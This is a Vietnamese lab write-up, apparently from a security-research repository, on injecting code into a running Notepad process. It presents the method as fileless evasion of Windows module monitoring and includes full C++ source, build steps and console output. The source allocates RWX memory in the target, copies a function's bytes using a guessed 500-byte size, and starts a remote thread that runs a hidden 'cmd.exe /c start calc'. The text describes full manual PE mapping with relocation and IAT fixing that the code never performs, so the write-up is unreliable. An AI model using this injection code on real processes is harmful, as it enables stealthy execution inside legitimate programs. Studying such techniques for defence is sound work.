
---

# 📝 [PE 09] PE Binary Injection (Full Portable Executable Remoting)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**PE Binary Injection (Tiêm nhiễm toàn tệp nhị phân PE)** đại diện cho một giải thuật can thiệp bộ nhớ ảo ở cấp độ nâng cao, thuộc nhóm kỹ thuật **Né tránh phòng thủ dựa trên cấu trúc mô-đun Image (Image-based Evasion)**.

Trong các phân hệ thực nghiệm trước, cấu trúc Payload thường bị giới hạn trong phạm vi các đoạn mã máy vị trí độc lập (Shellcode/PIC) ngắn hoặc phụ thuộc vào tính hiện diện của tệp tin trên đĩa cứng (Classic DLL Injection - PE 05). Giải thuật PE Binary Injection hóa giải toàn diện hai nhược điểm trên bằng cách **ánh xạ thủ công (Manual Mapping) toàn bộ một file thực thi Portable Executable độc lập trực tiếp vào lòng không gian địa chỉ ảo của một tiến trình hợp pháp khác**. Tiến trình mục tiêu sau cuộc đại phẫu sẽ chứa song song hai phân hệ PE: mô-đun gốc của chính nó và mô-đun PE ký sinh hoạt động ngầm bên trong. Hành vi này hoàn toàn không để lại dấu vết tệp tin vật lý (Fileless Artifacts) và bẻ gãy hoàn toàn cơ chế giám sát nạp mô-đun tiêu chuẩn của OS Subsystem.

### 🎯 Mục tiêu nghiên cứu:

* **Giải phẫu chuyên sâu PE/COFF Format**: Làm chủ cấu trúc định dạng tệp tin Portable Executable x64 bao gồm các phân đoạn Headers, Section Table, và các bản ghi thư mục dữ liệu (Data Directories).
* **Xây dựng Custom PE Loader chéo tiến trình**: Thiết kế thuật toán Manual Mapper độc lập, tự đảm nhận trách nhiệm cấu trúc bảng địa chỉ ảo ảo hóa, sửa lỗi dịch chuyển căn lề (Base Relocation) và phân giải bảng Import Address Table (IAT) trực tiếp trên RAM đối phương.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi một tệp tin PE được nạp lên bộ nhớ ảo thông qua các phân hệ tiêu chuẩn của OS, Windows PE Loader thực hiện phân rã các byte thô trên đĩa và ánh xạ chúng lên RAM dựa trên các tham số cấu hình định vị trong `IMAGE_OPTIONAL_HEADER`. Trong giải thuật Manual Mapping chéo tiến trình của Lab PE 09, Loader của ta phải tự đóng vai trò là một PE Loader thủ công, điều phối dòng chảy CPU qua 5 giai đoạn ngầm tại tầng Kernel:

```
[VirtualAllocEx: Phân bổ không gian ảo dựa theo thông số SizeOfImage]
       └──> [WriteProcessMemory: Ánh xạ thủ công PE Headers và các Section]
                 └──> [Base Relocation Table: Tính toán Delta và vá lỗi địa chỉ tuyệt đối từ xa]
                           └──> [IAT Resolution: Phân giải động các hàm hệ thống chéo RAM]
                                     └──> [CreateRemoteThread: Khai hỏa luồng tại EntryPoint ký sinh]

```
<br>
<img width="1222" height="2558" alt="image" src="https://github.com/user-attachments/assets/0f5a81cf-0197-4c6b-ba09-394844d11ae0" />


1. **Phân bổ không gian Image từ xa (`VirtualAllocEx`)**: Loader tiến hành giải phẫu cấu trúc NT Headers của file PE mục tiêu nhằm bóc tách thông số **`SizeOfImage`** (Tổng dung lượng không gian ảo mà file PE sẽ chiếm giữ khi nạp lên RAM). Kế tiếp, Loader phát lệnh `VirtualAllocEx` để cam kết (`MEM_COMMIT`) một vùng không gian ảo có kích thước vừa khít đến từng byte mang quyền hạn **`PAGE_EXECUTE_READWRITE` (RWX)** lọt lòng tiến trình đích.
2. **Ánh xạ cấu trúc phân đoạn (Manual Section Mapping)**:
* Loader sao chép toàn bộ phân đoạn **PE Headers** (bao gồm DOS Header, NT Headers, và Section Table) vào điểm khởi đầu của vùng nhớ ảo từ xa.
* Duyệt qua mảng danh mục phân đoạn của Section Table (`IMAGE_SECTION_HEADER`). Với mỗi phân đoạn chức năng cụ thể (`.text`, `.data`, `.rdata`), Loader thực hiện tính toán vị trí, bốc dữ liệu byte thô tương ứng từ bộ đệm và ghi vào đúng tọa độ địa chỉ tương đối ảo (**RVA - Relative Virtual Address**) của nó trên RAM tiến trình đích thông qua hàm `WriteProcessMemory`.


3. **Hiệu chỉnh dịch chuyển địa chỉ từ xa (Remote Base Relocation)**: Do vùng bộ nhớ ảo mới được cấp phát chéo tiến trình ngẫu nhiên cấu trúc theo cơ chế ASLR, tọa độ nạp thực tế hầu như không bao giờ trùng khớp với địa chỉ nạp cấu hình gốc (`ImageBase`) của file PE khi biên dịch. Loader bắt buộc phải truy cập vào cấu trúc thư mục dữ liệu `.reloc` (`IMAGE_DIRECTORY_ENTRY_BASERELOC`), tính toán khoảng sai lệch toán học Delta, duyệt qua từng khối (Block) dịch chuyển và thực hiện phép toán cộng bổ sửa trực tiếp các con trỏ địa chỉ tuyệt đối bên lòng RAM đối phương.
4. **Tái dựng bảng tra cứu hàm phụ thuộc từ xa (Remote IAT Resolution)**: Loader duyệt qua danh sách các thư viện liên kết động phụ thuộc được ghi nhận trong phân đoạn Import Directory (`IMAGE_DIRECTORY_ENTRY_IMPORT`). Với mỗi hàm hệ thống được mã nguồn sử dụng, Loader tiến hành bốc tách địa chỉ tuyệt đối của hàm đó từ RAM cục bộ (hoặc thông qua giải thuật PEB Walk nâng cao) rồi điền trực tiếp vào ô nhớ tương ứng trong bảng Import Address Table (IAT) nằm bên lòng RAM tiến trình đích.
5. **Khai hỏa điểm xuất phát ký sinh**: Hoàn tất ma trận nạp mô-đun thủ công, Loader tính toán tọa độ điểm nạp tuyệt đối từ xa dựa trên công thức cấu trúc:

$$\text{RemoteExecutionAddress} = \text{RemoteAllocatedBase} + \text{ntHeaders.OptionalHeader.AddressOfEntryPoint}$$



Ta gọi hàm `CreateRemoteThread` (hoặc luồng ngầm Native Subsystem `NtCreateThreadEx`) đâm thẳng vào tọa độ này để ép CPU của tiến trình đích kích hoạt chu kỳ thực thi mô-đun PE ký sinh.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối gánh luồng xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng sẽ được bốc tách mã máy để tiêm sang Notepad
// Hàm này tuân thủ tuyệt đối quy tắc độc lập vị trí: CHỈ dùng dữ liệu từ lpParam
DWORD WINAPI InjectedFunction(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng con trỏ tuyệt đối, né hoàn toàn hàng rào Loader Lock và lỗi RIP-Relative
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Hàm rỗng đánh dấu điểm kết thúc kịch khung để ước tính dung lượng mã máy
DWORD WINAPI InjectedFunctionEnd() { return 0; }

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 09: PE CODE INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // Tính toán kích thước động an toàn cho khối lệnh thực thi
    SIZE_T functionSize = 500;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess that bai!" << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 1: CẤP PHÁT VÙNG NHỚ TỪ XA MANG QUYỀN RWX ĐỂ CHỨA MÃ MÁY CỦA HÀM ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Cấp phát phân vùng dữ liệu từ xa mang quyền RW để chứa tham số cấu trúc tuyệt đối
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX trong Notepad dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 2: KHỞI TẠO DỮ LIỆU TUYỆT ĐỐI VÀ ĐẨY XUYÊN BIÊN GIỚI SANG RAM ĐÍCH ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        // Trích xuất chính xác tọa độ tuyệt đối của WinExec nạp sang Notepad
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Tiến hành ánh xạ chép khối mã máy và cấu trúc dữ liệu sang RAM đối phương
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)InjectedFunction, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa tung segment ma may va du lieu sang RAM doi phuong hoan tat." << std::endl;

    std::cout << "[*] Dang khoi tao luong CreateRemoteThread de kich no..." << std::endl;

    // ─── BƯỚC 3: ÉP TIẾN TRÌNH ĐÍCH TỰ SINH LUỒNG CHẠY MÃ MÁY ───
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        // Sử dụng cờ INFINITE để đảm bảo tiến trình hoàn tất việc mở máy tính một cách an toàn
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu kich no!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
    }

    // ─── BƯỚC 4: GIẢI PHÓNG TÀI NGUYÊN CHỐNG MEMORY LEAK ───
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] PE Code Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc nhị phân của Loader đạt trạng thái độc lập tuyến tính hoàn hảo, tối ưu hóa tốc độ giải phẫu cấu trúc PE từ xa mà không phụ thuộc vào các mô-đun liên kết động phụ trợ:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính mục `Runtime Library`, chuyển thông số sang định dạng cờ cấu hình tĩnh **`Multi-threaded (/MT)`**.
3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng lỗi chuỗi hệ thống.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường máy Lab, sau đó thực thi tệp tin nhị phân Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng thuật toán Manual Mapping chéo RAM:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE09_PE_Code_Injection\x64\Release> C:\Users\Admin\source\repos\Task6\PE09_PE_Code_Injection\x64\Release\PE_Code_Injection.exe
====================================================
[*] PE 09: PE CODE INJECTION REMOTE
====================================================
[+] Da tim thay Notepad.exe voi PID: 12084
[+] Vung nho Code RWX trong Notepad dat tai: 0x00000250E28A0000
[+] Anh xa tung segment ma may va du lieu sang RAM doi phuong hoan tat.
[*] Dang khoi tao luong CreateRemoteThread de kich no...
[+] Luong Thread tu xa da hoan thanh nhiem vu kich no!

[+] PE Code Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so...

```

### Demo: 
<img width="1920" height="600" alt="devenv_MMWbT4YRCD" src="https://github.com/user-attachments/assets/958bfc4c-d309-46c0-bbeb-9bf17e3c4b8a" />

---
